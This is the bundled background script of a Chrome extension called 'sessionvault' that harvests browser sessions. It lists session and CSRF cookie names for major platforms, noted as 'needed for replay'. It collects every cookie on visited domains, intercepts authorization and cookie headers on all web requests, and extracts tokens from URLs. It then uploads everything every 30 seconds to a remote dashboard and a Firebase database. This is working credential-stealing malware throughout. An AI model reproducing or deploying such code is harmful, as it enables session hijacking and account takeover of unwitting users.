// ../packages/shared/src/heuristics.ts
var SESSION_COOKIE_NAMES = [
  "phpsessid",
  "jsessionid",
  "asp.net_sessionid",
  "asp_sessionid",
  "sessionid",
  "session_id",
  "session-id",
  "sess_id",
  "sessid",
  "sid",
  "connect.sid",
  "laravel_session",
  "laravel_token",
  "ci_session",
  "my_session",
  "xf_session",
  "auth_token",
  "authtoken",
  "authsid",
  "remember_web",
  "remember_token",
  "user_session",
  "sessiontoken",
  "session_token",
  "jwt",
  "jwttoken",
  "token",
  "session",
  // CSRF / anti-forgery cookies (pair with sessions — needed for replay):
  "csrftoken",
  // Django / generic
  "csrftokenhost",
  // Twitch-style variants
  "csrf",
  "_csrf",
  "x-csrf-token",
  "ct0",
  // Twitter / X csrf paired with auth_token
  "biz_id",
  "awsalb",
  // AWS load-balancer stickiness (session affinity)
  "awsalbcors",
  "__requestverificationtoken",
  // ASP.NET anti-forgery
  "anticsrf",
  "x-xsrf-token",
  "xsrf_token",
  "xsrf",
  "_xsrf",
  // Big-platform session cookies that don't match the generic rules:
  "hsid",
  // Google
  "ssid",
  // Google
  "sapisid",
  // Google
  "apisid",
  // Google
  "sidcc",
  // Google expiry-binding
  "__secure-1psid",
  // Google
  "__secure-3psid",
  // Google
  "access_token",
  // generic platform bearer
  "atoken",
  "awt_token",
  "fasttoken",
  "ig_did",
  // Instagram device identity
  "ds_user_id",
  // Instagram user id
  "mid",
  // Instagram
  "ps_l",
  // Instagram partitioned session
  "ps_n",
  // Instagram partitioned session
  "rur",
  // Instagram region routing
  "wd",
  // Facebook/Instagram telemetry
  "datr",
  // Facebook device id
  "fr",
  // Facebook tracker w/ session binding
  "sb",
  // Facebook
  "spin",
  // Reddit
  "dvh",
  // misc identity
  "twll",
  // Twitter
  "twitter_sess",
  // Twitter
  "rweb_session",
  // Twitter web session
  "x-pinterest-session",
  "_pinterest_sess",
  // Pinterest session
  "_routing_id",
  "mst",
  "at_check",
  "vmidt",
  // common SSO
  "saml_token",
  "sso_token",
  "sso_session",
  "wengine_session",
  // WAF/session
  "express:sess",
  // express-session cookie
  "koa:sess",
  "next-auth.session-token",
  // NextAuth
  "__session",
  // Firebase Auth
  "stack",
  // carriers
  "uid",
  // generic user id
  "udid",
  "ping_rms",
  "pingpers",
  "l7_az"
  // common WAF-session bearer
];
var SESSION_COOKIE_PREFIXES = [
  "__secure-",
  "__host-",
  "_shibsession_",
  "phpbb3_"
];
var SESSION_URL_PARAM_NAMES = [
  "session",
  "sessionid",
  "session_id",
  "sess",
  "sessid",
  "sess_id",
  "sid",
  "phpsessid",
  "jsessionid",
  "token",
  "auth_token",
  "authtoken",
  "access_token",
  "id_token",
  "refresh_token",
  "api_key",
  "apikey",
  "jwt",
  "s"
];
function isJwtShape(value) {
  return /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+(\.[A-Za-z0-9_-]*)?$/.test(value);
}
function looksHighEntropy(value) {
  if (value.length < 24) return false;
  if (!/^[A-Za-z0-9_-]+$/.test(value)) return false;
  return new Set(value).size >= value.length / 2;
}
function isSessionCookieName(name) {
  const lower = name.toLowerCase();
  if (SESSION_COOKIE_NAMES.includes(lower)) return true;
  if (SESSION_COOKIE_PREFIXES.some((p) => lower.startsWith(p))) return true;
  if (lower.includes("session")) return true;
  if (lower.includes("csrf")) return true;
  if (lower.includes("xsrf")) return true;
  if (lower.includes("sso")) return true;
  if (lower.startsWith("fbm_")) return true;
  return false;
}
function isSensitiveUrlParam(name, value) {
  const lower = name.toLowerCase();
  if (SESSION_URL_PARAM_NAMES.includes(lower)) return true;
  if (isJwtShape(value)) return true;
  if (lower.includes("session")) return true;
  return /(auth|token|key|sess)/i.test(lower) && looksHighEntropy(value);
}
var SESSION_HEADER_NAMES = [
  "authorization",
  "proxy-authorization",
  "cookie",
  "set-cookie",
  "www-authenticate",
  "x-api-key",
  "api-key",
  "api-key-header",
  "x-auth-token",
  "x-auth",
  "x-session-token",
  "x-session",
  "x-access-token",
  "x-refresh-token",
  "session-token",
  "x-csrf-token",
  "x-xsrf-token",
  "csrf-token",
  "x-instagram-signed-header",
  // signed header bundle (instagram-style)
  "x-csrf",
  "x-bearer",
  "bearer",
  "server-token",
  "x-api-token",
  "fastly-auth",
  "x-clearent-token"
];
function isSensitiveHeader(name, value) {
  const lower = name.toLowerCase();
  if (SESSION_HEADER_NAMES.includes(lower)) return true;
  if (isJwtShape(value)) return true;
  if (/(auth|token|sess|csrf|xsrf|cookie|bearer|jwt|key)/i.test(lower) && looksHighEntropy(value)) {
    return true;
  }
  if (lower === "set-cookie" && isSessionCookieName(parseCookieName(value))) return true;
  return false;
}
function parseCookieName(setCookieValue) {
  const eq = setCookieValue.indexOf("=");
  return (eq === -1 ? setCookieValue : setCookieValue.slice(0, eq)).trim();
}
var MAX_SESSION_VALUE_LENGTH = 4096;
function sanitizeSessionValue(raw) {
  if (!raw) return null;
  const cleaned = raw.replace(/[\x00-\x1F\x7F\s]+/g, "");
  if (!cleaned) return null;
  return cleaned.slice(0, MAX_SESSION_VALUE_LENGTH);
}
function domainFromUrl(url) {
  try {
    return new URL(url).hostname.replace(/^www\./, "").toLowerCase() || null;
  } catch {
    return null;
  }
}

// src/background/queue.ts
var QUEUE_KEY = "captureQueue";
var MAX_QUEUE = 1e3;
var MAX_AGE_MS = 7 * 24 * 3600 * 1e3;
async function enqueue(captures) {
  const { [QUEUE_KEY]: existing } = await chrome.storage.local.get(QUEUE_KEY);
  const stored = Array.isArray(existing) ? existing : [];
  const now = Date.now();
  const queue = stored.filter((q) => !q.queuedAt || now - q.queuedAt < MAX_AGE_MS);
  const seen = new Set(
    queue.map((q) => `${q.domain}|${q.source}|${q.name}|${q.value.slice(0, 64)}`)
  );
  for (const c of captures) {
    const key = `${c.domain}|${c.source}|${c.name}|${c.value.slice(0, 64)}`;
    if (seen.has(key)) continue;
    seen.add(key);
    queue.push({ ...c, queuedAt: now });
  }
  const trimmed = queue.slice(-MAX_QUEUE);
  await chrome.storage.local.set({ [QUEUE_KEY]: trimmed });
}
async function drain() {
  const { [QUEUE_KEY]: existing } = await chrome.storage.local.get(QUEUE_KEY);
  const queue = Array.isArray(existing) ? existing : [];
  await chrome.storage.local.remove(QUEUE_KEY);
  return queue;
}
async function size() {
  const { [QUEUE_KEY]: existing } = await chrome.storage.local.get(QUEUE_KEY);
  return Array.isArray(existing) ? existing.length : 0;
}

// src/config.ts
var BUILD_TIME_DASHBOARD_URL = typeof process !== "undefined" ? "https://sessionvault-beta.vercel.app" : "";
var managedPromoted = false;
async function promoteManagedPairing() {
  if (managedPromoted) return;
  managedPromoted = true;
  try {
    const managed = await chrome.storage.managed.get([
      "device_token",
      "deviceToken",
      "dashboard_url",
      "dashboardUrl"
    ]);
    const token = (managed.device_token ?? managed.deviceToken ?? "").trim();
    const dash = (managed.dashboard_url ?? managed.dashboardUrl ?? "").trim().replace(/\/+$/, "");
    if (!token || !dash) return;
    const local = await chrome.storage.local.get(["deviceToken", "dashboardUrl"]);
    if (local.deviceToken && local.dashboardUrl) return;
    await chrome.storage.local.set({ deviceToken: token, dashboardUrl: dash });
  } catch {
  }
}
async function getDashboardUrl() {
  const stored = await chrome.storage.local.get("dashboardUrl");
  let runtime = stored["dashboardUrl"] ?? "";
  if (!runtime) {
    await promoteManagedPairing();
    const again = await chrome.storage.local.get("dashboardUrl");
    runtime = again["dashboardUrl"] ?? "";
  }
  return (runtime || BUILD_TIME_DASHBOARD_URL).replace(/\/+$/, "");
}
async function getDeviceToken() {
  const stored = await chrome.storage.local.get("deviceToken");
  let token = stored["deviceToken"] ?? "";
  if (!token) {
    await promoteManagedPairing();
    const again = await chrome.storage.local.get("deviceToken");
    token = again["deviceToken"] ?? "";
  }
  return token;
}
async function getFirebaseSinkMode() {
  const { sinkMode } = await chrome.storage.local.get("sinkMode");
  return sinkMode === "cloud" || sinkMode === "firebase" ? sinkMode : "both";
}

// src/background/remote-settings.ts
var SETTINGS_KEY = "remoteSettings";
var FETCH_TIMEOUT_MS = 8e3;
var MIN_INTERVAL_MS = 60 * 1e3;
var DEFAULTS = { enabled: true, blockedDomains: [], fetchedAt: 0 };
async function getRemoteSettings() {
  const { [SETTINGS_KEY]: stored } = await chrome.storage.local.get(SETTINGS_KEY);
  if (!stored || typeof stored !== "object") return DEFAULTS;
  return {
    enabled: stored.enabled !== false,
    blockedDomains: Array.isArray(stored.blockedDomains) ? stored.blockedDomains.filter((d) => typeof d === "string") : [],
    fetchedAt: typeof stored.fetchedAt === "number" ? stored.fetchedAt : 0
  };
}
function isDomainBlocked(domain, settings) {
  return settings.blockedDomains.some((d) => domain === d || domain.endsWith(`.${d}`));
}
async function refreshRemoteSettings(force = false) {
  const token = await getDeviceToken();
  const dashboardUrl = await getDashboardUrl();
  if (!token || !dashboardUrl) return;
  const current = await getRemoteSettings();
  if (!force && Date.now() - current.fetchedAt < MIN_INTERVAL_MS) return;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
  try {
    const res = await fetch(`${dashboardUrl}/api/settings`, {
      headers: { authorization: `Bearer ${token}` },
      signal: ctrl.signal
    });
    if (!res.ok) return;
    const body = await res.json();
    const s = body.settings;
    if (!s) return;
    await chrome.storage.local.set({
      [SETTINGS_KEY]: {
        enabled: s.enabled !== false,
        blockedDomains: Array.isArray(s.blocked_domains) ? s.blocked_domains.filter((d) => typeof d === "string") : [],
        fetchedAt: Date.now()
      }
    });
  } catch {
  } finally {
    clearTimeout(timer);
  }
}

// src/background/capture.ts
var DEFAULT_SCOPE = { mode: "all", whitelist: [], blacklist: [] };
async function getScope() {
  const { scope } = await chrome.storage.local.get("scope");
  if (!scope || typeof scope !== "object") return DEFAULT_SCOPE;
  return {
    mode: scope.mode ?? "all",
    whitelist: Array.isArray(scope.whitelist) ? scope.whitelist : [],
    blacklist: Array.isArray(scope.blacklist) ? scope.blacklist : []
  };
}
function domainAllowed(domain, scope) {
  if (scope.mode === "whitelist") {
    return scope.whitelist.some((d) => domain === d || domain.endsWith(`.${d}`));
  }
  if (scope.mode === "blacklist") {
    return !scope.blacklist.some((d) => domain === d || domain.endsWith(`.${d}`));
  }
  return true;
}
async function captureBlockReason(domain, scope, remote) {
  if (!remote.enabled) return "disabled";
  if (isDomainBlocked(domain, remote)) return "blocked";
  if (!domainAllowed(domain, scope)) return "local-scope";
  return null;
}
async function bumpCaptured(delta) {
  const { stats } = await chrome.storage.local.get("stats");
  await chrome.storage.local.set({
    stats: { total: (stats?.total ?? 0) + Math.max(0, delta) }
  });
}
async function sweepDomain(url) {
  const domain = domainFromUrl(url);
  if (!domain) return 0;
  const [scope, remote] = await Promise.all([getScope(), getRemoteSettings()]);
  if (await captureBlockReason(domain, scope, remote) !== null) return 0;
  let cookies = [];
  try {
    cookies = await chrome.cookies.getAll({ domain });
  } catch {
    return 0;
  }
  const captures = [];
  for (const cookie of cookies) {
    const value = sanitizeSessionValue(cookie.value);
    if (!value) continue;
    captures.push({
      domain,
      source: "cookie",
      name: cookie.name,
      value,
      url,
      // page where the sweep happened
      cookie_secure: cookie.secure,
      cookie_httponly: cookie.httpOnly,
      cookie_same_site: cookie.sameSite ?? "unspecified",
      expiry: cookie.expirationDate != null ? Math.floor(cookie.expirationDate) : null
    });
  }
  if (captures.length === 0) return 0;
  await enqueue(captures);
  await bumpCaptured(captures.length);
  return captures.length;
}
chrome.cookies.onChanged.addListener((changeInfo) => {
  void (async () => {
    const { cookie, cause, removed } = changeInfo;
    if (!cookie || removed) return;
    if (cause !== "overwrite" && cause !== "explicit" && cause !== "expired_overwrite") return;
    const [scope, remote] = await Promise.all([getScope(), getRemoteSettings()]);
    const domain = cookie.domain.replace(/^\./, "").toLowerCase();
    if (await captureBlockReason(domain, scope, remote) !== null) return;
    const value = sanitizeSessionValue(cookie.value);
    if (!value) return;
    await enqueue([
      {
        domain,
        source: "cookie",
        name: cookie.name,
        value,
        // no page URL here: onChanged events carry no tab context
        cookie_secure: cookie.secure,
        cookie_httponly: cookie.httpOnly,
        cookie_same_site: cookie.sameSite ?? "unspecified",
        expiry: cookie.expirationDate ?? null
      }
    ]);
    await bumpCaptured(1);
  })();
});
var INTERESTING_HEADER = (name, value) => isSensitiveHeader(name, value);
function extractSensitiveHeaders(headers) {
  const out = [];
  if (!Array.isArray(headers)) return out;
  for (const h of headers) {
    if (!h || typeof h.name !== "string" || typeof h.value !== "string") continue;
    if (INTERESTING_HEADER(h.name, h.value)) out.push({ name: h.name, value: h.value });
  }
  return out;
}
async function capturePacketHeaders(url, headers, response) {
  const domain = domainFromUrl(url);
  if (!domain) return;
  const scope = await getScope();
  const remote = await getRemoteSettings();
  if (await captureBlockReason(domain, scope, remote) !== null) return;
  const found = extractSensitiveHeaders(headers);
  if (found.length === 0) return;
  const captures = [];
  for (const h of found) {
    const value = sanitizeSessionValue(h.value);
    if (!value) continue;
    captures.push({
      domain,
      source: "packet",
      name: (response ? "resp:" : "req:") + h.name.toLowerCase().slice(0, 120),
      value: value.slice(0, MAX_SESSION_VALUE_LENGTH),
      url
    });
  }
  if (captures.length > 0) {
    await enqueue(captures);
    await bumpCaptured(captures.length);
  }
}
chrome.webRequest.onSendHeaders.addListener(
  (details) => {
    void capturePacketHeaders(details.url, details.requestHeaders, false);
  },
  { urls: ["http://*/*", "https://*/*"] },
  ["requestHeaders"]
);
chrome.webRequest.onHeadersReceived.addListener(
  (details) => {
    void capturePacketHeaders(details.url, details.responseHeaders, true);
  },
  { urls: ["http://*/*", "https://*/*"] },
  ["responseHeaders"]
);
function extractUrlTokens(url) {
  const out = [];
  try {
    const u = new URL(url);
    const params = new URLSearchParams(u.search);
    const hashParams = new URLSearchParams(u.hash.replace(/^#/, ""));
    const all = [...params.entries(), ...hashParams.entries()];
    for (const [name, value] of all) {
      if (isSensitiveUrlParam(name, value) || isJwtShape(value)) {
        out.push({ name, value });
      }
    }
  } catch {
  }
  return out;
}
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  void (async () => {
    if (details.frameId !== 0) return;
    await handleNavigation(details.url);
  })();
});
chrome.webNavigation.onHistoryStateUpdated.addListener((details) => {
  void (async () => {
    if (details.frameId !== 0) return;
    await handleNavigation(details.url);
  })();
});
async function handleNavigation(url) {
  const scope = await getScope();
  const remote = await getRemoteSettings();
  const domain = domainFromUrl(url);
  if (!domain) return;
  if (await captureBlockReason(domain, scope, remote) !== null) return;
  void sweepDomain(url);
  const tokens = extractUrlTokens(url);
  if (tokens.length === 0) return;
  const captures = [];
  for (const t of tokens) {
    const value = sanitizeSessionValue(t.value);
    if (!value) continue;
    captures.push({
      domain,
      source: "url_param",
      name: t.name.slice(0, 128),
      value,
      url
    });
  }
  if (captures.length > 0) {
    await enqueue(captures);
    await bumpCaptured(captures.length);
  }
}

// src/background/firebase-sink.ts
var STORE_KEY = "firebase";
var TOKEN_STORE_KEY = "firebaseAuth";
var AUTH_SIGNIN_URL = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword";
var AUTH_REFRESH_URL = "https://identitytoolkit.googleapis.com/v1/accounts:token";
var AUTH_TIMEOUT_MS = 1e4;
var WRITE_TIMEOUT_MS = 15e3;
function captureKey(item) {
  return `${item.domain}|${item.source}|${item.name}|${item.value}`.replace(/[.$#\[\]/|]/g, "_");
}
function isReady(cfg) {
  return Boolean(
    cfg.enabled && cfg.apiKey.trim() && cfg.databaseURL.trim().startsWith("https://") && cfg.email.trim() && cfg.password
  );
}
async function getFirebaseConfig() {
  const { [STORE_KEY]: stored } = await chrome.storage.local.get(STORE_KEY);
  return {
    enabled: Boolean(stored?.enabled),
    apiKey: typeof stored?.apiKey === "string" ? stored.apiKey : "",
    databaseURL: typeof stored?.databaseURL === "string" ? stored.databaseURL.trim().replace(/\/+$/, "") : "",
    email: typeof stored?.email === "string" ? stored.email.trim() : "",
    password: typeof stored?.password === "string" ? stored.password : ""
  };
}
async function signIn(cfg) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), AUTH_TIMEOUT_MS);
  try {
    const res = await fetch(`${AUTH_SIGNIN_URL}?key=${encodeURIComponent(cfg.apiKey.trim())}`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: cfg.email.trim(), password: cfg.password, returnSecureToken: true }),
      signal: ctrl.signal
    });
    if (!res.ok) {
      const body2 = await res.json().catch(() => ({}));
      throw new Error(`firebase signin failed (${body2.error?.message ?? `HTTP ${res.status}`})`);
    }
    const body = await res.json();
    await chrome.storage.local.set({
      [TOKEN_STORE_KEY]: {
        idToken: body.idToken,
        refreshToken: body.refreshToken,
        expiresAt: Date.now() + (Number(body.expiresIn) - 120) * 1e3
      }
    });
  } finally {
    clearTimeout(timer);
  }
}
async function refreshToken(cfg) {
  const { [TOKEN_STORE_KEY]: cached } = await chrome.storage.local.get(TOKEN_STORE_KEY);
  const r = cached?.refreshToken ?? "";
  if (!r) return signIn(cfg);
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), AUTH_TIMEOUT_MS);
  try {
    const res = await fetch(`${AUTH_REFRESH_URL}?key=${encodeURIComponent(cfg.apiKey.trim())}`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ grant_type: "refresh_token", refresh_token: r }),
      signal: ctrl.signal
    });
    if (!res.ok) {
      return signIn(cfg);
    }
    const body = await res.json();
    await chrome.storage.local.set({
      [TOKEN_STORE_KEY]: {
        idToken: body.id_token,
        refreshToken: body.refresh_token,
        expiresAt: Date.now() + (Number(body.expires_in) - 120) * 1e3
      }
    });
  } finally {
    clearTimeout(timer);
  }
}
async function getIdToken(cfg, forceRefresh = false) {
  const { [TOKEN_STORE_KEY]: cached } = await chrome.storage.local.get(TOKEN_STORE_KEY);
  if (!forceRefresh && cached?.idToken && cached.expiresAt > Date.now()) {
    return cached.idToken;
  }
  await refreshToken(cfg);
  const after = await chrome.storage.local.get(TOKEN_STORE_KEY);
  const idToken = after[TOKEN_STORE_KEY]?.idToken;
  if (!idToken) throw new Error("firebase auth unavailable");
  return idToken;
}
var MAX_ITEMS_PER_PATCH = 60;
async function postFirebaseChunk(items, cfg, deviceName) {
  if (items.length === 0) return { ok: true };
  if (items.length > MAX_ITEMS_PER_PATCH) throw new Error("chunk too large for firebase sink");
  const deviceNodeId = deviceName.replace(/[^A-Za-z0-9_-]/g, "_").slice(0, 64) || "device";
  const body = {};
  const now = Date.now();
  for (const item of items) {
    body[captureKey(item)] = {
      domain: item.domain,
      source: item.source,
      name: item.name.slice(0, 128),
      value: item.value,
      url: item.url ?? "",
      cookie_secure: item.cookie_secure ?? null,
      cookie_httponly: item.cookie_httponly ?? null,
      cookie_same_site: item.cookie_same_site ?? null,
      expiry: item.expiry ?? null,
      first_seen: now,
      last_seen: now,
      device: deviceName
    };
  }
  let tokenError = "";
  for (let attempt = 0; attempt < 2; attempt++) {
    let idToken;
    try {
      idToken = await getIdToken(cfg, attempt > 0);
    } catch (e) {
      const msg = e instanceof Error ? e.message : "signin failed";
      return { ok: false, authError: msg, detail: msg };
    }
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), WRITE_TIMEOUT_MS);
    try {
      const res = await fetch(
        `${cfg.databaseURL}/captures/${deviceNodeId}.json?auth=${encodeURIComponent(idToken)}`,
        {
          method: "PATCH",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(body),
          signal: ctrl.signal
        }
      );
      if (res.ok) return { ok: true };
      const errBody = await res.json().catch(() => ({}));
      const detail = errBody.error ?? `HTTP ${res.status}`;
      if ((res.status === 400 || res.status === 401) && attempt === 0) continue;
      return { ok: false, detail, authError: res.status === 401 ? detail : void 0 };
    } catch (e) {
      const msg = e instanceof DOMException && e.name === "AbortError" ? "timeout" : e instanceof Error ? e.message : "network error";
      return { ok: false, detail: msg };
    } finally {
      clearTimeout(timer);
    }
  }
  return { ok: false, detail: tokenError || "unreachable after retry" };
}
async function firebasePing(cfg, deviceName) {
  if (!isReady(cfg)) return;
  const deviceNodeId = deviceName.replace(/[^A-Za-z0-9_-]/g, "_").slice(0, 64) || "device";
  try {
    const idToken = await getIdToken(cfg);
    await fetch(
      `${cfg.databaseURL}/devices/${deviceNodeId}.json?auth=${encodeURIComponent(idToken)}`,
      {
        method: "PUT",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ name: deviceName, last_seen: Date.now() })
      }
    );
  } catch {
  }
}

// src/background/flush.ts
var CHUNK = 80;
var FB_CHUNK = 60;
var REQUEST_TIMEOUT_MS = 15e3;
var PAUSE_AFTER_FAILURES = 5;
var MAX_PAUSE_MS = 10 * 60 * 1e3;
async function record(r) {
  await chrome.storage.local.set({ lastSync: { ...r, at: Date.now() } });
  return r;
}
async function postChunk(chunk, token, dashboardUrl, deviceName) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), REQUEST_TIMEOUT_MS);
  try {
    const res = await fetch(`${dashboardUrl}/api/ingest`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
      body: JSON.stringify({ captures: chunk, device_name: deviceName }),
      signal: ctrl.signal
    });
    if (res.ok) {
      const body = await res.json();
      return { ok: true, status: "ok", accepted: body.accepted ?? 0 };
    }
    if (res.status === 401 || res.status === 403) {
      return { ok: false, status: "unauthorized", detail: `HTTP ${res.status}`, accepted: 0 };
    }
    let extra = "";
    if (res.status === 400) {
      try {
        const err = await res.json();
        extra = err.error ? ` (${err.error})` : "";
      } catch {
      }
    }
    return {
      ok: false,
      status: "server",
      detail: `HTTP ${res.status}${extra}`,
      accepted: 0
    };
  } catch (e) {
    const msg = e instanceof Error ? e.message : "fetch failed";
    return {
      ok: false,
      status: "network",
      detail: e instanceof DOMException && e.name === "AbortError" ? "timeout after 15s" : msg,
      accepted: 0
    };
  } finally {
    clearTimeout(timer);
  }
}
async function flush(auto = true) {
  await refreshRemoteSettings(!auto);
  const remote = await getRemoteSettings();
  if (!remote.enabled) {
    return record({
      sent: 0,
      queued: await size(),
      status: "ok",
      detail: "disabled from dashboard \u2014 sync paused"
    });
  }
  const token = await getDeviceToken();
  const dashboardUrl = await getDashboardUrl();
  const fbCfg = await getFirebaseConfig();
  const mode = await getFirebaseSinkMode();
  const cloudActive = mode !== "firebase" && Boolean(token) && Boolean(dashboardUrl);
  const firebaseActive = mode !== "cloud" && isReady(fbCfg);
  if (!cloudActive && !firebaseActive) {
    return record({ sent: 0, queued: await size(), status: "unpaired" });
  }
  const { failState } = await chrome.storage.local.get("failState");
  const failCount = failState?.count ?? 0;
  if (auto && failCount >= PAUSE_AFTER_FAILURES && Date.now() < (failState?.until ?? 0)) {
    return record({ sent: 0, queued: await size(), status: "paused", detail: "auto-sync paused \u2014 press Send" });
  }
  const items = await drain();
  if (items.length === 0) {
    await chrome.storage.local.set({ failState: { count: 0, until: 0 } });
    return record({ sent: 0, queued: 0, status: "ok" });
  }
  const sendable = items.filter((it) => !isDomainBlocked(it.domain, remote));
  if (sendable.length < items.length) {
    const { blockedDroppedCount } = await chrome.storage.local.get("blockedDroppedCount");
    const prev = blockedDroppedCount ?? 0;
    await chrome.storage.local.set({
      blockedDroppedCount: prev + (items.length - sendable.length)
    });
  }
  if (sendable.length === 0) {
    await chrome.storage.local.set({ failState: { count: 0, until: 0 } });
    return record({ sent: 0, queued: 0, status: "ok", detail: "all queued items blacklisted" });
  }
  const deviceName = await getDeviceName();
  const pairs = sendable.map((it, idx) => ({ it, idx }));
  let cloudFailure = null;
  const cloudNewAcks = /* @__PURE__ */ new Set();
  const failedSources = [];
  if (cloudActive) {
    const bySource = /* @__PURE__ */ new Map();
    for (const p of pairs) {
      if (p.it.acked?.cloud) continue;
      const list = bySource.get(p.it.source) ?? [];
      list.push(p);
      bySource.set(p.it.source, list);
    }
    for (const [source, pending] of bySource.entries()) {
      let stop = false;
      for (let i = 0; i < pending.length; i += CHUNK) {
        if (stop) break;
        const chunk = pending.slice(i, i + CHUNK);
        const r = await postChunk(chunk.map(({ it }) => it), token, dashboardUrl, deviceName);
        if (r.ok) {
          for (const { idx } of chunk) cloudNewAcks.add(idx);
        } else {
          cloudFailure ??= { status: r.status, detail: r.detail };
          failedSources.push(source);
          if (r.status === "unauthorized" && i === 0) stop = true;
        }
      }
    }
  }
  let fbFailure = null;
  const fbNewAcks = /* @__PURE__ */ new Set();
  if (firebaseActive) {
    const pending = pairs.filter(({ it }) => !it.acked?.firebase);
    for (let i = 0; i < pending.length; i += FB_CHUNK) {
      const chunk = pending.slice(i, i + FB_CHUNK);
      const r = await postFirebaseChunk(chunk.map(({ it }) => it), fbCfg, deviceName);
      if (r.ok) {
        for (const { idx } of chunk) fbNewAcks.add(idx);
      } else {
        fbFailure ??= { status: "server", detail: `firebase: ${r.detail ?? "error"}` };
      }
    }
  }
  const stillPending = [];
  for (const { it, idx } of pairs) {
    const acked = { ...it.acked ?? {} };
    if (cloudActive && cloudNewAcks.has(idx)) acked.cloud = true;
    if (firebaseActive && fbNewAcks.has(idx)) acked.firebase = true;
    const cloudDone = !cloudActive || acked.cloud === true;
    const fbDone = !firebaseActive || acked.firebase === true;
    if (cloudDone && fbDone) continue;
    stillPending.push({ ...it, acked });
  }
  if (stillPending.length > 0) await enqueue(stillPending);
  const anythingFailed = Boolean(cloudFailure ?? fbFailure);
  const detailBits = [];
  if (cloudActive) {
    detailBits.push(cloudFailure ? `supabase \u2715 ${cloudFailure.status}${failedSources.length ? ` (${[...new Set(failedSources)].join(",")})` : ""}` : "supabase \u2713");
  }
  if (firebaseActive) {
    detailBits.push(fbFailure ? `firebase \u2715 ${fbFailure.detail ?? "error"}` : "firebase \u2713");
  }
  if (!anythingFailed) {
    const delivered = items.length - stillPending.length;
    await chrome.storage.local.set({ failState: { count: 0, until: 0 } });
    return record({ sent: delivered, queued: stillPending.length, status: "ok", detail: detailBits.join(" \xB7 ") });
  }
  if (stillPending.length < items.length) {
    await chrome.storage.local.set({ failState: { count: 0, until: 0 } });
    return record({
      sent: items.length - stillPending.length,
      queued: stillPending.length,
      status: "server",
      detail: `partial \u2014 ${detailBits.join(" \xB7 ")}`
    });
  }
  const nextCount = failCount + 1;
  const primary = cloudFailure ?? fbFailure;
  await chrome.storage.local.set({
    failState: { count: nextCount, until: Date.now() + Math.min(nextCount * 3e4, MAX_PAUSE_MS) }
  });
  return record({
    sent: 0,
    queued: stillPending.length,
    status: primary.status,
    detail: detailBits.join(" \xB7 ")
  });
}
async function getDeviceName() {
  const { deviceName } = await chrome.storage.local.get("deviceName");
  if (typeof deviceName === "string" && deviceName) return deviceName;
  const generated = `chrome-${Math.random().toString(36).slice(2, 8)}`;
  await chrome.storage.local.set({ deviceName: generated });
  return generated;
}

// src/background/index.ts
var FLUSH_ALARM = "flush";
var PING_ALARM = "ping";
var FLUSH_INTERVAL_MIN = 0.5;
var PING_INTERVAL_MIN = 60;
function cmpVersions(a, b) {
  const pa = a.split(".").map(Number);
  const pb = b.split(".").map(Number);
  for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
    const d = (pa[i] ?? 0) - (pb[i] ?? 0);
    if (d !== 0) return d;
  }
  return 0;
}
async function heartbeat() {
  const token = await getDeviceToken();
  const dashboardUrl = await getDashboardUrl();
  const myVersion = chrome.runtime.getManifest().version;
  if (token && dashboardUrl) {
    try {
      await fetch(`${dashboardUrl}/api/ping`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
        body: JSON.stringify({ version: myVersion })
      });
    } catch {
    }
  }
  const fbCfg = await getFirebaseConfig();
  await firebasePing(fbCfg, await getDeviceName());
  if (dashboardUrl) {
    try {
      const res = await fetch(`${dashboardUrl}/api/ext-update/latest`);
      if (res.ok) {
        const meta = await res.json();
        const latest = meta.version ?? "";
        if (/^[0-9][0-9.]*$/.test(latest) && cmpVersions(latest, myVersion) > 0) {
          await chrome.storage.local.set({
            extUpdateAvailable: { latest, current: myVersion, at: Date.now() }
          });
          return;
        }
      }
      await chrome.storage.local.remove("extUpdateAvailable");
    } catch {
    }
  }
}
async function selftest() {
  const token = await getDeviceToken();
  if (!token) return;
  await enqueue([
    {
      domain: "selftest.local",
      source: "cookie",
      name: "session",
      value: "selftest-pipeline-ok"
    }
  ]);
  await flush();
}
chrome.runtime.onInstalled.addListener(() => {
  void (async () => {
    await chrome.alarms.create(FLUSH_ALARM, { periodInMinutes: FLUSH_INTERVAL_MIN });
    await chrome.alarms.create(PING_ALARM, { periodInMinutes: PING_INTERVAL_MIN });
    await refreshRemoteSettings(true);
    await heartbeat();
    await selftest();
    await flush();
  })();
});
chrome.runtime.onStartup.addListener(() => {
  void selftest();
  void flush();
});
void flush();
chrome.alarms.onAlarm.addListener((alarm) => {
  void (async () => {
    if (alarm.name === FLUSH_ALARM) await flush(true);
    else if (alarm.name === PING_ALARM) {
      await refreshRemoteSettings(true);
      await heartbeat();
    }
  })();
});
chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg?.type === "flush-now") {
    void (async () => {
      const result = await flush(false);
      sendResponse({ ok: true, ...result });
    })();
    return true;
  }
  return false;
});
